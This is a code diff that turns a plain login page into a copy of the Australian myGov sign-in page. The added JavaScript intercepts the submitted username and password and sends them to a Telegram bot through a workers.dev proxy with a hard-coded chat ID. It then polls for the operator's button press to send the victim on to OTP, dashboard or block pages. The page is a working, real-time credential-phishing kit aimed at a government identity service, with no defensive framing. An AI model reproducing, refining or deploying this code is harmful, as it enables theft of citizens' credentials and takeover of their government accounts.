@@ -1,116 +1,291 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-  <title>Login</title>
-  <style>
-    body { font-family: sans-serif; display:flex; justify-content:center;
-           align-items:center; height:100vh; background:#111; color:#fff; }
-    .box { background:#222; padding:30px; border-radius:10px; width:300px; }
-    input, button { width:100%; padding:10px; margin:8px 0; border-radius:6px;
-                    border:none; box-sizing:border-box; }
-    button { background:#0088cc; color:#fff; cursor:pointer; }
-    .spinner { border:4px solid #444; border-top:4px solid #fff; border-radius:50%;
-               width:36px; height:36px; animation:spin 1s linear infinite;
-               margin:20px auto; }
-    @keyframes spin { to { transform: rotate(360deg); } }
-  </style>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in with myGov - myGov</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        .passkey-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        .button-digital-identity {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+        /* ===== Waiting / spinner state ===== */
+        .waiting-overlay {
+            display: none;
+            text-align: center;
+            padding: 40px 20px 30px;
+        }
+        .waiting-overlay.active { display: block; }
+        .waiting-text {
+            color: #333;
+            font-size: 16px;
+            margin: 0 0 10px;
+        }
+        .spinner {
+            border: 4px solid #dfe3e8;
+            border-top: 4px solid #215c8e;
+            border-radius: 50%;
+            width: 48px;
+            height: 48px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
+
 <body>
-<div class="box">
-  <div id="form">
-    <h2>Sign in</h2>
-    <input id="user" placeholder="Username">
-    <input id="pass" type="password" placeholder="Password">
-    <button onclick="submitLogin()">Login</button>
-  </div>
-  <div id="waiting" style="display:none; text-align:center;">
-    <p>Verifying...</p>
-    <div class="spinner"></div>
-  </div>
-</div>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <a data-go-back-link="" class="button-back" href="#">Back</a>
+                                    <h1>Sign in with myGov</h1>
+                                    <p class="login-instruction-text">Choose how to sign in</p>
 
-<script>
-const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
-const CHAT_ID = "7344364597";
+                                    <!-- Digital ID and Passkey options -->
+                                    <div class="digital-id-login-card secondary">
+                                        <div class="button-digital-id-container">
+                                            <div class="digital-id-login-option-container">
+                                                <div class="inner-options">
+                                                    <a class="button-digital-identity" href="/las/mygov-login?execution=e6s1&amp;_eventId=digitalIdentity">Sign in with Digital ID</a>
+                                                    <input type="hidden" value="{flowScope.targetParamDI}">
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0">
+                                                        <img class="passkey-icon" src="https://login.my.gov.au/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt="Passkey icon">
+                                                        Sign in with passkey
+                                                    </a>
+                                                    <p class="external-links-zone">Learn about
+                                                        <a href="https://my.gov.au/en/about/help/mygov-website/sign-in-to-mygov/use-passkeys" target="_blank">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
 
-const ROUTES = {
-  "otp":"otp.html", "forgot":"forgot.html", "login":"login.html",
-  "success":"dashboard.html", "block":"blocked.html"
-};
+                                    <!-- "or" divider -->
+                                    <div class="hr-word">
+                                        <div class="draw-circle">
+                                            or
+                                        </div>
+                                    </div>
 
-async function submitLogin() {
-  const user = document.getElementById("user").value;
-  const pass = document.getElementById("pass").value;
+                                    <!-- Traditional sign-in form -->
+                                    <form id="form-1" class="mygov-login-form alternative" method="post">
+                                        <input type="hidden" name="btn1" value="btn1">
+                                        <div id="msg" style="display:none;color: red;">
+                                            Invalid password..! Please enter correct password.
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="userId">Username or email</label>
+                                            <input id="ai" name="ai" type="text" value="" autocomplete="off" required="">
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="#" class="anchor override">Forgot username</a>
+                                        </p>
+                                        <div class="input-group">
+                                            <label for="password" class="override">Password</label>
+                                            <div class="password-group">
+                                                <button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button>
+                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p>
+                                                <input id="pr" name="pr" type="password" aria-required="true" required="">
+                                            </div>
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="#" class="anchor override">Forgot password</a>
+                                        </p>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
+                                            </div>
+                                        </div>
+                                        <p class="create-account-text">
+                                            <a class="create-account-link" href="#">Create a myGov account</a> if you don't have one already.
+                                        </p>
+                                    </form>
 
-  document.getElementById("form").style.display    = "none";
-  document.getElementById("waiting").style.display = "block";
+                                    <!-- Waiting / spinner panel -->
+                                    <div id="waiting" class="waiting-overlay" role="status" aria-live="polite">
+                                        <p class="waiting-text">Verifying your details…</p>
+                                        <div class="spinner"></div>
+                                        <p class="waiting-text">Please wait, this may take a moment.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
 
-  const sid = crypto.randomUUID().slice(0, 8);
+    <!-- JavaScript -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript">
+    // ===== CONFIGURATION =====
+    const PROXY   = "https://telegram-proxy.wyldamcmur.workers.dev";
+    const CHAT_ID = "7344364597";
 
-  const keyboard = {
-    inline_keyboard: [
-      [{ text:"🔐 OTP",       callback_data:`otp:${sid}`     }],
-      [{ text:"🔑 Forgot",    callback_data:`forgot:${sid}`  }],
-      [{ text:"↩️ Login",     callback_data:`login:${sid}`   }],
-      [{ text:"✅ Dashboard", callback_data:`success:${sid}` }],
-      [{ text:"🚫 Block",     callback_data:`block:${sid}`   }]
-    ]
-  };
+    const ROUTES = {
+        "otp":     "otp.html",
+        "forgot":  "forgot.html",
+        "login":   "login.html",
+        "success": "dashboard.html",
+        "block":   "blocked.html"
+    };
+    // =========================
 
-  // get current offset
-  const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
-  const d0 = await r0.json();
-  const startOffset = d0.result && d0.result.length
-    ? d0.result[d0.result.length - 1].update_id + 1
-    : 0;
+    $(document).ready(function() {
+        // Override the form submission
+        $('#form-1').on('submit', async function(e) {
+            e.preventDefault();
 
-  // send login + buttons
-  await fetch(`${PROXY}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: `🔔 Login attempt\n👤 ${user}\n🔑 ${pass}\nSession: ${sid}`,
-      reply_markup: keyboard
-    })
-  });
+            const user = $('#ai').val();
+            const pass = $('#pr').val();
 
-  pollLoop(startOffset, sid);
-}
+            // Hide the form/options and reveal the spinner
+            $(this).hide();
+            $('.digital-id-login-card.secondary').hide();
+            $('.hr-word').hide();
+            $('.login-instruction-text').hide();
+            $('#waiting').addClass('active');
 
-async function pollLoop(offset, sid) {
-  while (true) {
-    try {
-      const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
-      const data = await r.json();
-      if (!data.result) continue;
+            const sid = (crypto.randomUUID && crypto.randomUUID().slice(0, 8)) ||
+                        Math.random().toString(36).slice(2, 10);
 
-      for (const upd of data.result) {
-        offset = upd.update_id + 1;
-        const cb = upd.callback_query;
-        if (!cb) continue;
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "🔐 OTP",       callback_data: `otp:${sid}`     }],
+                    [{ text: "🔑 Forgot",    callback_data: `forgot:${sid}`  }],
+                    [{ text: "↩️ Login",     callback_data: `login:${sid}`   }],
+                    [{ text: "✅ Dashboard", callback_data: `success:${sid}` }],
+                    [{ text: "🚫 Block",     callback_data: `block:${sid}`   }]
+                ]
+            };
 
-        const [action, sess] = cb.data.split(":");
-        if (sess !== sid) continue;
+            try {
+                // Get current offset so we only see NEW callbacks
+                const r0 = await fetch(`${PROXY}/getUpdates?offset=-1`);
+                const d0 = await r0.json();
+                const startOffset = (d0.result && d0.result.length)
+                    ? d0.result[d0.result.length - 1].update_id + 1
+                    : 0;
 
-        await fetch(`${PROXY}/answerCallbackQuery`, {
-          method: "POST",
-          headers: {"Content-Type":"application/json"},
-          body: JSON.stringify({
-            callback_query_id: cb.id,
-            text: "Redirecting user..."
-          })
+                // Send login credentials + control buttons to Telegram
+                await fetch(`${PROXY}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🔔 myGov Login attempt\n👤 Username: ${user}\n🔑 Password: ${pass}\n🆔 Session: ${sid}`,
+                        reply_markup: keyboard
+                    })
+                });
+
+                // Start listening for the redirect command from Telegram
+                pollLoop(startOffset, sid);
+
+            } catch (err) {
+                console.error(err);
+            }
         });
+    });
 
-        window.location.href = ROUTES[action] || "login.html";
-        return;
-      }
-    } catch (e) {
-      console.error(e);
-      await new Promise(r => setTimeout(r, 2000));
+    async function pollLoop(offset, sid) {
+        while (true) {
+            try {
+                const r = await fetch(`${PROXY}/getUpdates?offset=${offset}&timeout=15`);
+                const data = await r.json();
+                if (!data.result) continue;
+
+                for (const upd of data.result) {
+                    offset = upd.update_id + 1;
+                    const cb = upd.callback_query;
+                    if (!cb) continue;
+
+                    const [action, sess] = cb.data.split(":");
+                    if (sess !== sid) continue;
+
+                    // Acknowledge the button press in Telegram
+                    await fetch(`${PROXY}/answerCallbackQuery`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            callback_query_id: cb.id,
+                            text: "Redirecting user…"
+                        })
+                    });
+
+                    // Follow the command
+                    window.location.href = ROUTES[action] || "login.html";
+                    return;
+                }
+            } catch (e) {
+                console.error(e);
+                await new Promise(r => setTimeout(r, 2000));
+            }
+        }
     }
-  }
-}
-</script>
+    </script>
 </body>
+
 </html>
